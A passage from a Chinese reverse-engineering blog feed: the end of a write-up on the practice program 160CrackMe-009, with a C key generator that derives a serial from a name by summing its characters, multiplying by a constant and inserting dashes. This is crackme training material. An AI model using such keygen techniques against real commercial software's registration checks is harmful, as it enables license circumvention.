class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入name\n&quot;</span>);<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br><span class="hljs-built_in">gets_s</span>(name);<br><span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> key = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>&#123;<br>key += name[i];<br>&#125;<br>key *= <span class="hljs-number">0x499602D2</span>;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">30</span>];<br><span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%lld&quot;</span>, key);<br>buf[<span class="hljs-number">3</span>] = <span class="hljs-string">&#x27;-&#x27;</span>;<br>buf[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;-&#x27;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;你的key是：\n%s&quot;</span>, buf);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/09/160CrackMe-009/7.png"></p><p><img src="/2021/08/09/160CrackMe-009/8.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>分析起来不难，主要是VB的特性让人很折磨。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这个VB的程序，调用的时候都是传入一个地址，然后地址直接查看是什么也看不到，没有什么有用的，分析起来看得人一头雾水。查了资料之后才知道，VB</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ackie.cn/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ackie.cn/tags/CrackMe/"/>
    
  </entry>
  
</feed>
